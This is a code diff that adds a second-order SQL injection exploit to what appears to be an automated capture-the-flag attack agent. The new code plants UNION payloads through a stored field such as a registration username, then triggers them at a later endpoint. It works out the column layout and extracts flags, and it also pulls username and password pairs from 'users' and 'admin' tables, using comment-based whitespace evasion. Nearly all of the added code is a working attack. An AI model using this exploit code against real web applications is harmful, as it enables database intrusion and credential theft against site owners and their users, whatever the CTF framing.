@@ -44,6 +44,7 @@ from .dispatcher_helpers import (
     _quote_sql_identifier,
     _resolve_auth_login_url,
     _resolve_compose_file,
+    _with_query,
 )
 
 _SQLI_AUTH_BYPASS_PAYLOADS = (
@@ -83,6 +84,56 @@ _BLIND_TABLES_EXPR = (
     "select(group_concat(table_name))from(information_schema.tables)"
     "where(table_schema=database())"
 )
+
+# ---------------------------------------------------------------------------
+# Second-order SQLi: plant in one request, trigger in a later one
+# ---------------------------------------------------------------------------
+# The injectable value is not used by the query that stores it — it is persisted
+# (a registration username, an order note, a comment) and only later
+# concatenated verbatim into a *different* query on a trigger endpoint. sqlmap
+# and every first-order strategy probe the store request, see the value echoed
+# back safely, and conclude "not injectable" — they never reach the deferred
+# sink. This extractor plants a UNION payload in the stored field, hits the
+# trigger endpoint where the stored value is re-queried, and reads the reflected
+# result. Each probe is a two-request (store → trigger) cycle, so it is bounded
+# tightly and gated on a recognized store→reuse shape (never fires blind).
+_SECOND_ORDER_MAX_COLUMNS = 6
+_SECOND_ORDER_REQUEST_BUDGET = 140
+_SECOND_ORDER_SENTINEL = "FH2ND0RDER"
+_SECOND_ORDER_SENTINEL_HEX = "0x" + _SECOND_ORDER_SENTINEL.encode().hex()
+# Compact flag-location repertoire tried at the confirmed column layout. Each
+# expression is self-contained (parenthesised sub-select) and whitespace-free
+# (``/**/`` separators) so it survives both the second query's string context
+# and any incidental space filtering.
+_SECOND_ORDER_FLAG_EXPRS = (
+    "(select/**/group_concat(flag)/**/from/**/flag)",
+    "(select/**/group_concat(flag)/**/from/**/flags)",
+    "(select/**/flag/**/from/**/flag/**/limit/**/1)",
+    "(select/**/group_concat(concat_ws(0x7e,username,password))/**/from/**/users)",
+    "(select/**/group_concat(concat_ws(0x7e,username,password))/**/from/**/admin)",
+    "(select/**/group_concat(table_name)/**/from/**/information_schema.tables"
+    "/**/where/**/table_schema=database())",
+)
+
+
+def _second_order_union_value(
+    nonce: str,
+    expr: str,
+    column_count: int,
+    position: int,
+    separator: str,
+) -> str:
+    """Build a stored value that becomes a UNION at the trigger query.
+
+    ``nonce'`` closes the string the trigger query wraps it in; the trailing
+    ``#`` comments out that query's own closing quote / suffix. ``nonce`` keeps
+    each stored row unique so a UNIQUE-key store (registration) never rejects it.
+    """
+    columns = [
+        expr if index == position else str(index)
+        for index in range(1, column_count + 1)
+    ]
+    return f"{nonce}'{separator}union{separator}select{separator}{','.join(columns)}#"
 
 
 def _blind_normalize_body(body: str) -> str:
@@ -901,6 +952,185 @@ class SQLiExecutorMixin:
 
         # Oracle confirmed injection even if no flag surfaced — that is progress.
         return _ChainOutcome(progress=True, reason="; ".join(reasons))
+
+    async def _second_order_store(
+        self,
+        store_url: str,
+        method: str,
+        field: str,
+        value: str,
+        extra: dict[str, Any],
+    ) -> dict[str, Any]:
+        fields: dict[str, str] = {field: value}
+        for key, val in (extra or {}).items():
+            fields.setdefault(str(key), str(val))
+        if method == "GET":
+            return await self.runtime.proxy_action(
+                "request", method="GET", url=_with_query(store_url, fields), timeout=20
+            ) or {}
+        return await self.runtime.proxy_action(
+            "request", method="POST", url=store_url, data=fields, timeout=20
+        ) or {}
+
+    async def _second_order_trigger(
+        self,
+        trigger_url: str,
+        method: str,
+        param: str | None,
+        value: str | None,
+    ) -> dict[str, Any]:
+        if method == "GET":
+            url = trigger_url
+            if param and value is not None:
+                url = _with_query(trigger_url, {str(param): value})
+            return await self.runtime.proxy_action(
+                "request", method="GET", url=url, timeout=20
+            ) or {}
+        data = {str(param): value} if param and value is not None else {}
+        return await self.runtime.proxy_action(
+            "request", method="POST", url=trigger_url, data=data, timeout=20
+        ) or {}
+
+    async def _attempt_second_order_sqli(
+        self,
+        target: str,
+        exploit_info: dict[str, Any],
+        *,
+        artifact_url: str,
+    ) -> _ChainOutcome:
+        """Store a UNION payload in one request, extract it from the trigger query.
+
+        Models the cyberpunk-class ceiling. ``exploit_info`` (built by
+        ``_recent_second_order_sqli_source_exploit`` from leaked source) names the
+        store surface (registration/create field) and the trigger endpoint that
+        re-queries the stored value. Phase A confirms the deferred UNION reflects
+        by planting a sentinel across column-count × position layouts; Phase B
+        walks a compact flag-location repertoire at the confirmed layout. A
+        recovered flag is verification-gated (evidence: http-response).
+        """
+        self.tool_guard.require(["http_request"])
+        payloads = exploit_info if isinstance(exploit_info, dict) else {}
+        store_field = str(payloads.get("store_field") or "username")
+        store_method = str(payloads.get("store_method") or "POST").upper()
+        trigger_method = str(payloads.get("trigger_method") or "GET").upper()
+        trigger_param = payloads.get("trigger_param")
+        trigger_param = str(trigger_param) if trigger_param else None
+        store_extra = payloads.get("store_extra") if isinstance(payloads.get("store_extra"), dict) else {}
+        base = _base_target(target)
+        store_url = urljoin(base + "/", str(payloads.get("store_path") or "/register").lstrip("/"))
+        trigger_url = urljoin(base + "/", str(payloads.get("trigger_path") or "/").lstrip("/"))
+        host = urlparse(target).netloc or target
+
+        self._emit(
+            f"[CTF dispatcher] second-order SQLi: store {store_field}@{store_url} "
+            f"→ trigger {trigger_url} ({artifact_url})"
+        )
+
+        budget = _SECOND_ORDER_REQUEST_BUDGET
+        nonce_seq = 0
+        progress = False
+        confirmed: tuple[int, int, str] | None = None
+
+        # Phase A — confirm the deferred UNION reflects; discover column layout.
+        for column_count in range(1, _SECOND_ORDER_MAX_COLUMNS + 1):
+            for position in range(1, column_count + 1):
+                for separator in ("/**/", " "):
+                    if budget <= 0:
+                        break
+                    budget -= 1
+                    nonce_seq += 1
+                    nonce = f"fh2o{nonce_seq:04d}"
+                    value = _second_order_union_value(
+                        nonce, _SECOND_ORDER_SENTINEL_HEX, column_count, position, separator
+                    )
+                    await self._second_order_store(store_url, store_method, store_field, value, store_extra)
+                    resp = await self._second_order_trigger(
+                        trigger_url, trigger_method, trigger_param, value if trigger_param else None
+                    )
+                    body = str((resp or {}).get("body") or "")
+                    progress = progress or bool(body)
+                    await self._scan_and_store(body, target, evidence_source="http-response")
+                    if _SECOND_ORDER_SENTINEL in body:
+                        confirmed = (column_count, position, separator)
+                        break
+                if confirmed is not None:
+                    break
+            if confirmed is not None:
+                break
+
+        if confirmed is None:
+            return _ChainOutcome(
+                progress=progress, reason="second-order SQLi: no deferred UNION oracle reflected"
+            )
+
+        column_count, position, separator = confirmed
+        await self._store_note(
+            key="ctf_second_order_sqli_confirmed",
+            value=(
+                f"deferred UNION reflects at {trigger_url} via stored {store_field} "
+                f"(cols={column_count}, echo-position={position})"
+            ),
+            category="vulnerability",
+            target=host,
+            url=trigger_url,
+            weaknesses=[
+                {
+                    "id": "second-order-sqli",
+                    "description": (
+                        "A value stored in one request is re-queried unsanitized on a "
+                        "trigger endpoint; a UNION payload planted at the store surface "
+                        "executes in the deferred query."
+                    ),
+                }
+            ],
+        )
+
+        # Phase B — extract the flag at the confirmed layout.
+        for expr in _SECOND_ORDER_FLAG_EXPRS:
+            if budget <= 0:
+                break
+            budget -= 1
+            nonce_seq += 1
+            nonce = f"fh2o{nonce_seq:04d}"
+            value = _second_order_union_value(nonce, expr, column_count, position, separator)
+            await self._second_order_store(store_url, store_method, store_field, value, store_extra)
+            resp = await self._second_order_trigger(
+                trigger_url, trigger_method, trigger_param, value if trigger_param else None
+            )
+            body = str((resp or {}).get("body") or "")
+            await self._scan_and_store(body, target, evidence_source="http-response")
+            if flag := self._extract_runtime_flag(body):
+                verification = await self._observe_flag(
+                    flag,
+                    target,
+                    evidence_source="http-response",
+                    rationale=f"second-order SQLi via stored {store_field} → {trigger_url}",
+                )
+                if verification.decision in {"verified", "runtime"}:
+                    await self._store_note(
+                        key="ctf_second_order_sqli_extract",
+                        value=f"second-order UNION extract succeeded via {artifact_url}",
+                        category="vulnerability",
+                        target=host,
+                        url=trigger_url,
+                        weaknesses=[
+                            {
+                                "id": "second-order-sqli",
+                                "description": "Deferred UNION injection recovered the flag from the trigger query.",
+                            }
+                        ],
+                    )
+                    return _ChainOutcome(
+                        progress=True,
+                        flag=verification.flag,
+                        reason=f"second-order SQLi runtime exploit via {artifact_url}",
+                        verified=verification.decision == "verified",
+                    )
+
+        # Oracle confirmed even without a flag — genuine progress.
+        return _ChainOutcome(
+            progress=True, reason="second-order SQLi oracle confirmed but flag not extracted"
+        )
 
     async def _attempt_sqlmap_sqli(
         self,
